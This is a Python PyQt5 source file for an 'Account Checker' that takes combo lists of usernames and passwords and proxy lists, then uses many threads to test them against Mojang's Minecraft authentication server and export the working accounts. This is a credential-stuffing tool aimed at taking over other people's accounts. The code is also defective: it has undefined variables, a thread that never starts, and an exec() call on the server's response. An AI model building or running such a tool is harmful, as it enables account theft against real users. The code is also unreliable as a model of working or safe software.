# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file 'accountchecker.ui'
#
# Created by: PyQt5 UI code generator 5.11.3
#
# WARNING! All changes made in this file will be lost!

missingmodules = False
import sys
try:
    from PyQt5 import QtCore, QtGui, QtWidgets, uic
    from PyQt5.QtCore import pyqtSlot, QObject
except:
    missingmodules = True
    print("Missing modules PyQt")
try:
    import requests
    import json
except:
    missingmodules = True
    print("Missing modules requests/json")
import ctypes
try:
    from tkinter import filedialog
    from tkinter import *
    from pathlib import Path
except:
    missingmodules = True
    print("Missing modules tkinter")
import os
try:
    import urllib.request, urllib.parse, urllib.error
    import urllib.request, urllib.error, urllib.parse
    import urllib3
    import certifi
    import json
    from win10toast import ToastNotifier
except:
    missingmodules = True
    print("Missing modules urllibs/ceritif")

if missingmodules == True:
    import ctypes
    ctypes.windll.user32.MessageBoxW(0, 'You are missing some python modules', 'Missing modules', 16)
else:


    class Ui_MainWindow(object):
        def setupUi(self, MainWindow):
            MainWindow.setObjectName("MainWindow")
            MainWindow.resize(839, 551)
            palette = QtGui.QPalette()
            brush = QtGui.QBrush(QtGui.QColor(255, 255, 255))
            brush.setStyle(QtCore.Qt.SolidPattern)
            palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.WindowText, brush)
            brush = QtGui.QBrush(QtGui.QColor(255, 255, 255))
            brush.setStyle(QtCore.Qt.SolidPattern)
            palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Base, brush)
            brush = QtGui.QBrush(QtGui.QColor(49, 49, 49))
            brush.setStyle(QtCore.Qt.SolidPattern)
            palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Window, brush)
            brush = QtGui.QBrush(QtGui.QColor(255, 255, 255))
            brush.setStyle(QtCore.Qt.SolidPattern)
            palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.WindowText, brush)
            brush = QtGui.QBrush(QtGui.QColor(255, 255, 255))
            brush.setStyle(QtCore.Qt.SolidPattern)
            palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Base, brush)
            brush = QtGui.QBrush(QtGui.QColor(49, 49, 49))
            brush.setStyle(QtCore.Qt.SolidPattern)
            palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Window, brush)
            brush = QtGui.QBrush(QtGui.QColor(120, 120, 120))
            brush.setStyle(QtCore.Qt.SolidPattern)
            palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.WindowText, brush)
            brush = QtGui.QBrush(QtGui.QColor(49, 49, 49))
            brush.setStyle(QtCore.Qt.SolidPattern)
            palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.Base, brush)
            brush = QtGui.QBrush(QtGui.QColor(49, 49, 49))
            brush.setStyle(QtCore.Qt.SolidPattern)
            palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.Window, brush)
            MainWindow.setPalette(palette)
            font = QtGui.QFont()
            font.setFamily("Kalinga")
            font.setPointSize(9)
            MainWindow.setFont(font)
            self.centralwidget = QtWidgets.QWidget(MainWindow)
            self.centralwidget.setObjectName("centralwidget")
            self.label = QtWidgets.QLabel(self.centralwidget)
            self.label.setGeometry(QtCore.QRect(7, 3, 162, 33))
            font = QtGui.QFont()
            font.setPointSize(14)
            self.label.setFont(font)
            self.label.setObjectName("label")
            self.manual_username = QtWidgets.QLineEdit(self.centralwidget)
            self.manual_username.setGeometry(QtCore.QRect(106, 39, 146, 20))
            self.manual_username.setObjectName("manual_username")
            self.manual_password = QtWidgets.QLineEdit(self.centralwidget)
            self.manual_password.setGeometry(QtCore.QRect(106, 68, 147, 20))
            self.manual_password.setClearButtonEnabled(True)
            self.manual_password.setObjectName("manual_password")
            self.label_2 = QtWidgets.QLabel(self.centralwidget)
            self.label_2.setGeometry(QtCore.QRect(4, 39, 103, 19))
            self.label_2.setObjectName("label_2")
            self.label_3 = QtWidgets.QLabel(self.centralwidget)
            self.label_3.setGeometry(QtCore.QRect(4, 68, 102, 27))
            self.label_3.setObjectName("label_3")
            self.label_4 = QtWidgets.QLabel(self.centralwidget)
            self.label_4.setGeometry(QtCore.QRect(259, 45, 88, 33))
            font = QtGui.QFont()
            font.setPointSize(14)
            self.label_4.setFont(font)
            self.label_4.setObjectName("label_4")
            self.label_5 = QtWidgets.QLabel(self.centralwidget)
            self.label_5.setGeometry(QtCore.QRect(350, 41, 220, 16))
            palette = QtGui.QPalette()
            brush = QtGui.QBrush(QtGui.QColor(255, 0, 4))
            brush.setStyle(QtCore.Qt.SolidPattern)
            palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.WindowText, brush)
            brush = QtGui.QBrush(QtGui.QColor(255, 0, 4))
            brush.setStyle(QtCore.Qt.SolidPattern)
            palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.WindowText, brush)
            brush = QtGui.QBrush(QtGui.QColor(120, 120, 120))
            brush.setStyle(QtCore.Qt.SolidPattern)
            palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.WindowText, brush)
            self.label_5.setPalette(palette)
            self.label_5.setObjectName("label_5")
            self.label_6 = QtWidgets.QLabel(self.centralwidget)
            self.label_6.setGeometry(QtCore.QRect(351, 55, 365, 30))
            palette = QtGui.QPalette()
            brush = QtGui.QBrush(QtGui.QColor(255, 0, 0))
            brush.setStyle(QtCore.Qt.SolidPattern)
            palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.WindowText, brush)
            brush = QtGui.QBrush(QtGui.QColor(255, 0, 0))
            brush.setStyle(QtCore.Qt.SolidPattern)
            palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.WindowText, brush)
            brush = QtGui.QBrush(QtGui.QColor(120, 120, 120))
            brush.setStyle(QtCore.Qt.SolidPattern)
            palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.WindowText, brush)
            self.label_6.setPalette(palette)
            self.label_6.setObjectName("label_6")
            self.label_7 = QtWidgets.QLabel(self.centralwidget)
            self.label_7.setGeometry(QtCore.QRect(352, 73, 261, 30))
            palette = QtGui.QPalette()
            brush = QtGui.QBrush(QtGui.QColor(255, 0, 0))
            brush.setStyle(QtCore.Qt.SolidPattern)
            palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.WindowText, brush)
            brush = QtGui.QBrush(QtGui.QColor(255, 0, 0))
            brush.setStyle(QtCore.Qt.SolidPattern)
            palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.WindowText, brush)
            brush = QtGui.QBrush(QtGui.QColor(120, 120, 120))
            brush.setStyle(QtCore.Qt.SolidPattern)
            palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.WindowText, brush)
            self.label_7.setPalette(palette)
            self.label_7.setObjectName("label_7")
            self.pushButton = QtWidgets.QPushButton(self.centralwidget)
            self.pushButton.setGeometry(QtCore.QRect(141, 103, 75, 23))
            self.pushButton.setObjectName("pushButton")
            self.line = QtWidgets.QFrame(self.centralwidget)
            self.line.setGeometry(QtCore.QRect(6, 128, 828, 16))
            self.line.setFrameShape(QtWidgets.QFrame.HLine)
            self.line.setFrameShadow(QtWidgets.QFrame.Sunken)
            self.line.setObjectName("line")
            self.workingaccounts = QtWidgets.QListWidget(self.centralwidget)
            self.workingaccounts.setGeometry(QtCore.QRect(623, 173, 209, 268))
            self.workingaccounts.setFrameShadow(QtWidgets.QFrame.Raised)
            self.workingaccounts.setLineWidth(2)
            self.workingaccounts.setMidLineWidth(2)
            self.workingaccounts.setHorizontalScrollBarPolicy(QtCore.Qt.ScrollBarAlwaysOff)
            self.workingaccounts.setEditTriggers(QtWidgets.QAbstractItemView.NoEditTriggers)
            self.workingaccounts.setTabKeyNavigation(True)
            self.workingaccounts.setProperty("isWrapping", False)
            self.workingaccounts.setLayoutMode(QtWidgets.QListView.SinglePass)
            self.workingaccounts.setObjectName("workingaccounts")
            self.label_9 = QtWidgets.QLabel(self.centralwidget)
            self.label_9.setGeometry(QtCore.QRect(641, 146, 165, 25))
            font = QtGui.QFont()
            font.setPointSize(14)
            self.label_9.setFont(font)
            self.label_9.setObjectName("label_9")
            self.label_8 = QtWidgets.QLabel(self.centralwidget)
            self.label_8.setGeometry(QtCore.QRect(7, 211, 101, 24))
            font = QtGui.QFont()
            font.setFamily("Kalinga")
            font.setPointSize(9)
            font.setBold(True)
            font.setWeight(75)
            self.label_8.setFont(font)
            self.label_8.setObjectName("label_8")
            self.label_10 = QtWidgets.QLabel(self.centralwidget)
            self.label_10.setGeometry(QtCore.QRect(6, 284, 179, 24))
            font = QtGui.QFont()
            font.setFamily("Kalinga")
            font.setPointSize(9)
            font.setBold(True)
            font.setWeight(75)
            self.label_10.setFont(font)
            self.label_10.setObjectName("label_10")
            self.label_11 = QtWidgets.QLabel(self.centralwidget)
            self.label_11.setGeometry(QtCore.QRect(8, 148, 261, 16))
            self.label_11.setObjectName("label_11")
            self.label_12 = QtWidgets.QLabel(self.centralwidget)
            self.label_12.setGeometry(QtCore.QRect(8, 165, 119, 16))
            self.label_12.setObjectName("label_12")
            self.label_13 = QtWidgets.QLabel(self.centralwidget)
            self.label_13.setGeometry(QtCore.QRect(8, 184, 119, 16))
            self.label_13.setObjectName("label_13")
            self.proxyFile = QtWidgets.QToolButton(self.centralwidget)
            self.proxyFile.setGeometry(QtCore.QRect(153, 216, 181, 20))
            font = QtGui.QFont()
            font.setPointSize(9)
            self.proxyFile.setFont(font)
            self.proxyFile.setObjectName("proxyFile")
            self.accountsFile = QtWidgets.QToolButton(self.centralwidget)
            self.accountsFile.setGeometry(QtCore.QRect(153, 288, 181, 20))
            font = QtGui.QFont()
            font.setPointSize(9)
            self.accountsFile.setFont(font)
            self.accountsFile.setObjectName("accountsFile")
            self.line_2 = QtWidgets.QFrame(self.centralwidget)
            self.line_2.setGeometry(QtCore.QRect(604, 3, 16, 541))
            self.line_2.setFrameShape(QtWidgets.QFrame.VLine)
            self.line_2.setFrameShadow(QtWidgets.QFrame.Sunken)
            self.line_2.setObjectName("line_2")
            self.label_14 = QtWidgets.QLabel(self.centralwidget)
            self.label_14.setGeometry(QtCore.QRect(631, 15, 189, 16))
            font = QtGui.QFont()
            font.setFamily("Kalinga")
            font.setPointSize(11)
            font.setBold(True)
            font.setWeight(75)
            self.label_14.setFont(font)
            self.label_14.setObjectName("label_14")
            self.authserver = QtWidgets.QLineEdit(self.centralwidget)
            self.authserver.setGeometry(QtCore.QRect(626, 110, 194, 20))
            font = QtGui.QFont()
            font.setPointSize(8)
            self.authserver.setFont(font)
            self.authserver.setObjectName("authserver")
            self.label_15 = QtWidgets.QLabel(self.centralwidget)
            self.label_15.setGeometry(QtCore.QRect(628, 38, 194, 16))
            self.label_15.setObjectName("label_15")
            self.label_16 = QtWidgets.QLabel(self.centralwidget)
            self.label_16.setGeometry(QtCore.QRect(628, 55, 194, 16))
            self.label_16.setObjectName("label_16")
            self.label_17 = QtWidgets.QLabel(self.centralwidget)
            self.label_17.setGeometry(QtCore.QRect(627, 73, 194, 16))
            self.label_17.setObjectName("label_17")
            self.label_18 = QtWidgets.QLabel(self.centralwidget)
            self.label_18.setGeometry(QtCore.QRect(627, 91, 194, 16))
            self.label_18.setObjectName("label_18")
            self.label_19 = QtWidgets.QLabel(self.centralwidget)
            self.label_19.setGeometry(QtCore.QRect(6, 354, 101, 24))
            font = QtGui.QFont()
            font.setFamily("Kalinga")
            font.setPointSize(9)
            font.setBold(True)
            font.setWeight(75)
            self.label_19.setFont(font)
            self.label_19.setObjectName("label_19")
            self.threads = QtWidgets.QSpinBox(self.centralwidget)
            self.threads.setGeometry(QtCore.QRect(153, 355, 153, 22))
            self.threads.setWrapping(False)
            self.threads.setButtonSymbols(QtWidgets.QAbstractSpinBox.UpDownArrows)
            self.threads.setAccelerated(False)
            self.threads.setMinimum(2)
            self.threads.setMaximum(1000)
            self.threads.setObjectName("threads")
            self.line_3 = QtWidgets.QFrame(self.centralwidget)
            self.line_3.setGeometry(QtCore.QRect(0, 410, 612, 16))
            self.line_3.setFrameShape(QtWidgets.QFrame.HLine)
            self.line_3.setFrameShadow(QtWidgets.QFrame.Sunken)
            self.line_3.setObjectName("line_3")
            self.export_2 = QtWidgets.QPushButton(self.centralwidget)
            self.export_2.setGeometry(QtCore.QRect(662, 457, 116, 23))
            self.export_2.setObjectName("export_2")
            self.start = QtWidgets.QPushButton(self.centralwidget)
            self.start.setGeometry(QtCore.QRect(455, 380, 75, 23))
            self.start.setObjectName("start")
            self.label_20 = QtWidgets.QLabel(self.centralwidget)
            self.label_20.setGeometry(QtCore.QRect(439, 175, 104, 33))
            font = QtGui.QFont()
            font.setPointSize(14)
            self.label_20.setFont(font)
            self.label_20.setObjectName("label_20")
            self.label_21 = QtWidgets.QLabel(self.centralwidget)
            self.label_21.setGeometry(QtCore.QRect(236, 420, 100, 33))
            font = QtGui.QFont()
            font.setPointSize(14)
            self.label_21.setFont(font)
            self.label_21.setObjectName("label_21")
            self.label_22 = QtWidgets.QLabel(self.centralwidget)
            self.label_22.setGeometry(QtCore.QRect(60, 472, 485, 21))
            palette = QtGui.QPalette()
            brush = QtGui.QBrush(QtGui.QColor(167, 167, 167))
            brush.setStyle(QtCore.Qt.SolidPattern)
            palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.WindowText, brush)
            brush = QtGui.QBrush(QtGui.QColor(167, 167, 167))
            brush.setStyle(QtCore.Qt.SolidPattern)
            palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.WindowText, brush)
            brush = QtGui.QBrush(QtGui.QColor(120, 120, 120))
            brush.setStyle(QtCore.Qt.SolidPattern)
            palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.WindowText, brush)
            self.label_22.setPalette(palette)
            font = QtGui.QFont()
            font.setPointSize(16)
            self.label_22.setFont(font)
            self.label_22.setObjectName("label_22")
            self.label_23 = QtWidgets.QLabel(self.centralwidget)
            self.label_23.setGeometry(QtCore.QRect(136, 497, 319, 20))
            palette = QtGui.QPalette()
            brush = QtGui.QBrush(QtGui.QColor(167, 167, 167))
            brush.setStyle(QtCore.Qt.SolidPattern)
            palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.WindowText, brush)
            brush = QtGui.QBrush(QtGui.QColor(167, 167, 167))
            brush.setStyle(QtCore.Qt.SolidPattern)
            palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.WindowText, brush)
            brush = QtGui.QBrush(QtGui.QColor(120, 120, 120))
            brush.setStyle(QtCore.Qt.SolidPattern)
            palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.WindowText, brush)
            self.label_23.setPalette(palette)
            font = QtGui.QFont()
            font.setPointSize(16)
            self.label_23.setFont(font)
            self.label_23.setObjectName("label_23")
            self.label_24 = QtWidgets.QLabel(self.centralwidget)
            self.label_24.setGeometry(QtCore.QRect(416, 252, 157, 16))
            font = QtGui.QFont()
            font.setBold(True)
            font.setWeight(75)
            self.label_24.setFont(font)
            self.label_24.setObjectName("label_24")
            self.delay = QtWidgets.QSpinBox(self.centralwidget)
            self.delay.setGeometry(QtCore.QRect(428, 272, 127, 22))
            self.delay.setMinimum(1)
            self.delay.setMaximum(10000)
            self.delay.setSingleStep(2)
            self.delay.setProperty("value", 50)
            self.delay.setObjectName("delay")
            self.checkIfPremium = QtWidgets.QCheckBox(self.centralwidget)
            self.checkIfPremium.setGeometry(QtCore.QRect(412, 324, 172, 17))
            self.checkIfPremium.setObjectName("checkIfPremium")
            self.notifyAtCompletion = QtWidgets.QCheckBox(self.centralwidget)
            self.notifyAtCompletion.setGeometry(QtCore.QRect(412, 354, 161, 17))
            self.notifyAtCompletion.setObjectName("notifyAtCompletion")
            self.proxies = QtWidgets.QLineEdit(self.centralwidget)
            self.proxies.setGeometry(QtCore.QRect(153, 240, 181, 20))
            self.proxies.setObjectName("proxies")
            self.accounts = QtWidgets.QLineEdit(self.centralwidget)
            self.accounts.setGeometry(QtCore.QRect(153, 312, 181, 20))
            self.accounts.setObjectName("accounts")
            self.label_25 = QtWidgets.QLabel(self.centralwidget)
            self.label_25.setGeometry(QtCore.QRect(125, 243, 27, 16))
            self.label_25.setObjectName("label_25")
            self.label_26 = QtWidgets.QLabel(self.centralwidget)
            self.label_26.setGeometry(QtCore.QRect(125, 314, 27, 16))
            self.label_26.setObjectName("label_26")
            MainWindow.setCentralWidget(self.centralwidget)
            self.statusbar = QtWidgets.QStatusBar(MainWindow)
            self.statusbar.setObjectName("statusbar")
            MainWindow.setStatusBar(self.statusbar)

            self.retranslateUi(MainWindow)
            self.pushButton.clicked.connect(manual_check)
            self.proxyFile.clicked.connect(load_proxies)
            self.accountsFile.clicked.connect(load_accounts)
            self.start.clicked.connect(start_checking)
            self.export_2.clicked.connect(export_to_file)
            QtCore.QMetaObject.connectSlotsByName(MainWindow)

        def retranslateUi(self, MainWindow):
            _translate = QtCore.QCoreApplication.translate
            MainWindow.setWindowTitle(_translate("MainWindow", "Account Checker - Cynet"))
            self.label.setText(_translate("MainWindow", "Account checker"))
            self.label_2.setText(_translate("MainWindow", "Username/Email:"))
            self.label_3.setText(_translate("MainWindow", "Password:"))
            self.label_4.setText(_translate("MainWindow", "[Manual]"))
            self.label_5.setText(_translate("MainWindow", "*Does not cover password- it is echoed."))
            self.label_6.setText(_translate("MainWindow", "*Multiple failed attempts might cause the"))
            self.label_7.setText(_translate("MainWindow", "authentication server to blacklist your ip/proxy"))
            self.pushButton.setText(_translate("MainWindow", "Check"))
            self.label_9.setText(_translate("MainWindow", "Working accounts"))
            self.label_8.setText(_translate("MainWindow", "Load proxies:"))
            self.label_10.setText(_translate("MainWindow", "Load account combos:"))
            self.label_11.setText(_translate("MainWindow", "Format:"))
            self.label_12.setText(_translate("MainWindow", "username:password"))
            self.label_13.setText(_translate("MainWindow", "username:password"))
            self.label_13.adjustSize()
            self.proxyFile.setText(_translate("MainWindow", "Proxies file.."))
            self.accountsFile.setText(_translate("MainWindow", "Accounts file..."))
            self.label_14.setText(_translate("MainWindow", "Authserver:"))
            self.authserver.setText(_translate("MainWindow", "https://authserver.mojang.com/authenticate"))
            self.label_15.setText(_translate("MainWindow", "(API that authenticates users. You"))
            self.label_16.setText(_translate("MainWindow", "need to have the endpoint too."))
            self.label_17.setText(_translate("MainWindow", "You should leave this unless its"))
            self.label_18.setText(_translate("MainWindow", "changed in the future.)"))
            self.label_19.setText(_translate("MainWindow", "Threads:"))
            self.threads.setSuffix(_translate("MainWindow", " threads"))
            self.export_2.setText(_translate("MainWindow", "Export to file"))
            self.start.setText(_translate("MainWindow", "Start"))
            self.label_20.setText(_translate("MainWindow", "[Checking]"))
            self.label_21.setText(_translate("MainWindow", "[Cracking]"))
            self.label_22.setText(_translate("MainWindow", "This section has been moved to a new module."))
            self.label_23.setText(_translate("MainWindow", "Use \"Account Cracker\" instead."))
            self.label_24.setText(_translate("MainWindow", "Delay between attempts:"))
            self.delay.setSuffix(_translate("MainWindow", " milliseconds"))
            self.checkIfPremium.setText(_translate("MainWindow", "Check if user is premium?"))
            self.notifyAtCompletion.setText(_translate("MainWindow", "Notify when completed"))
            self.proxies.setText(_translate("MainWindow", "Path to proxies file"))
            self.accounts.setText(_translate("MainWindow", "Path to username:password file"))
            self.label_25.setText(_translate("MainWindow", "or.."))
            self.label_26.setText(_translate("MainWindow", "or.."))

    def msgbox(title, text, mb = 0):
        return ctypes.windll.user32.MessageBoxW(0, text, title, mb)

    def isPremium(username):
        url = 'https://api.mojang.com/users/profiles/minecraft/'
        http = urllib3.PoolManager(cert_reqs='CERT_REQUIRED', ca_certs=certifi.where())
        try:
            r = http.request('GET', url + line)
        except Exception as e:
            msgbox('Error while checking if {} is premium'.format(username), str(e))

        try:
            r_data = json.loads(r.data.decode('utf8'))
        except Exception as e:
            msgbox('Error while checking if {} is premium'.format(username), str(e))
            r_data = ""

        if r_data:
            return (True, r_data['id'])
        else:
            return (False, 'None')

    headers = {'Content-Type': 'application/json'}
    @QtCore.pyqtSlot()
    def manual_check():
        
        username = ui.manual_username.text()
        password = ui.manual_password.text()
        authserv = ui.authserver.text()
        data = json.dumps({"agent":{"name":"Minecraft","version":1},"username":username,"password":password,"clientToken":""})
        try:
            r = requests.post(authserver, data=data, headers=headers)
        except Exception as e:
            print(str(e))
            return

        result = r.text
        exec('result = {}'.format(result.replace('false', '"false"').replace('true', '"true"')))
        try:
            if result['error'] == 'Method Not Allowed':
                msgbox('Error while authenticating', result['errorMessage'])
            elif result['error'] == 'Not Found':
                msgbox('Error while authenticating', result['errorMessage'] + '\n(No endpoint specified in authserver')
            elif result['error'] == 'ForbiddenOperationException':
                try:
                    if result['cause'] == 'UserMigratedException':
                        msgbox('Error while authenticating', 'User is migrated, use email instead.')
                        return
                    else:
                        msgbox('Error while authenticating', result['errorMessage'] + '\(or too many logins with the username recently')
                        return
                    msgbox('Error while authenticating', 'accessToken was invalid (Invalid token.]')
                except Exception as e:
                    msgbox('Error while handling (Error while authenticating)', str(e))
            elif result['error'] == 'IllegalArgumentException':
                msgbox('Error while authenticating', result['errorMessage'])
            elif result == 'Unsupported Media Type':
                msgbox('Error while authenticating', result['errorMessage'] + '\Data was not submitted as application/json.\n(Possibly a bug)')
        except Exception as e:
            msgbox('Error while checking for errors', '{}\nResult: {}'.format(str(e), result))
        else:
            display = json.dumps(result, indent=2)
            msgbox('Authenticated', 'User information:\n' + display)

    workingaccounts = []
    def addaccount(item):
        ui.workingaccounts.addItem(item)
        workingaccounts = []

    @QtCore.pyqtSlot()
    def load_proxies():
        Tk().withdraw()
        filename = filedialog.askopenfilename(initialdir = "/",title = "Select proxies file",filetypes = (("Text files","*.txt"),("all files","*.*")))
        if filename == '':
            return
        ui.proxies.setText(filename)

    @QtCore.pyqtSlot()
    def load_accounts():
        Tk().withdraw()
        filename = filedialog.askopenfilename(initialdir = "/",title = "Select accounts file",filetypes = (("Text files","*.txt"),("all files","*.*")))
        if filename == '':
            return
        ui.accounts.setText(filename)

    def validate(username,password, authserver):
        data = json.dumps({"agent":{"name":"Minecraft","version":1},"username":username,"password":password,"clientToken":""})
        try:
            r = requests.post(authserver, data=data, headers=headers)
        except Exception as e:
            return False

        if "error" in r.text.lower():
            return False
        else:
            return True

    def validatethread(accounts, authserver, a=None):
        for combo in accounts:
            if checking == True:
                username,password = combo.split(':')
                if validate(username, password, authserver) == True:
                    addaccount('{}:{}'.format(username,password))
                checkedaccounts+=1
            else:
                break #cancelled checking

    def notify(title, content, duration=5):
        toaster = ToastNotifier()
        toaster.show_toast(title,
                           content,
                           duration=duration) 

    checkedaccounts = 0
    checking = False
    @QtCore.pyqtSlot()
    def start_checking():
        workingaccounts = []
        try:
            ui.workingaccounts.clear()
            ui.start.setEnabled(False)
            ui.delay.setEnabled(False)
            ui.threads.setEnabled(False)
            ui.accounts.setEnabled(False)
            ui.accountsFile.setEnabled(False)
            ui.proxies.setEnabled(False)
            ui.proxyFile.setEnabled(False)
            ui.checkIfPremium.setEnabled(False)
            ui.notifyAtCompletion.setEnabled(False)
            ui.authserver.setEnabled(False)
        except Exception as e:
            print(str(e))
        ui.start.setText('Loading proxies..')
        ui.start.adjustSize()

        proxies = ui.proxies.text()
        accounts = ui.accounts.text()
        threads = int(ui.threads.text().replace(' threads', ''))
        delay = int(ui.delay.text().replace(' milliseconds', ''))
        authserv = ui.authserver.text()
        checkIfPremium = ui.checkIfPremium.isChecked()

        ui.start.setText('Loading accounts..')
        ui.start.adjustSize()

        accounts = []
        with open(accounts, 'r') as f:
            for line in f:
                if checkIfPremium == True:
                    result = isPremium(line.strip(' ').strip('\n'))
                    if result[0] == True:
                        accounts.append(line.strip(' ').strip('\n'))
                    else:
                        addaccount(line.strip(' ').strip('\n') + ' [NOT PREMIUM]')
                else:
                    accounts.append(line.strip(' ').strip('\n'))

        ui.start.setText('Checking..')
        ui.start.adjustSize()

        checking = True
        checkedaccounts = 0

        #split accounts for each thread
        available_accounts = len(accounts)
        threads = threads

        amount_per_thread = int(available_accounts / threads)
        final_thread_amount = amount_per_thread + (available_accounts - (amount_per_thread * threads))
        
        del available_accounts

        afrom = 0
        ato = amount_per_thread

        for i in range(threads - 1):
            Thread(target=validatethread, args=(accounts[afrom:ato], authserver)).start()
            afrom = ato
            ato+=amount_per_thread

        if len(accounts[afrom:]) > 0:
            Thread(target=validatethread,args=(accounts[afrom:], authserver))

        lenacc = len(accounts)

        while not checkedaccounts >= lenacc:
            pass

        checking = False #kill all threads
        notify = ui.notifyAtCompletion.isChecked()
        if notify == True:
            notify('Account Checker - Cynet', 'Successfully completed operation')
            
            
       

    @QtCore.pyqtSlot()
    def export_to_file():
        Tk().withdraw()
        filename = filedialog.asksaveasfilename(defaultextension='.txt')
        if filename == '':
            return
        Path(filename).touch()
        try:
            items = []
            for i in range(ui.workingaccounts.count()):
                items.append(str(ui.workingaccounts.item(i)))
            with open(filename, 'w') as f:
                f.write('\n'.join(items))

            msgbox('Operation complete', 'Successfully saved to ' + filename)
        except Exception as e:
            print(str(e))

    import sys
    app = QtWidgets.QApplication(sys.argv)
    MainWindow = QtWidgets.QMainWindow()
    ui = Ui_MainWindow()
    ui.setupUi(MainWindow)
    MainWindow.show()
    sys.exit(app.exec_())

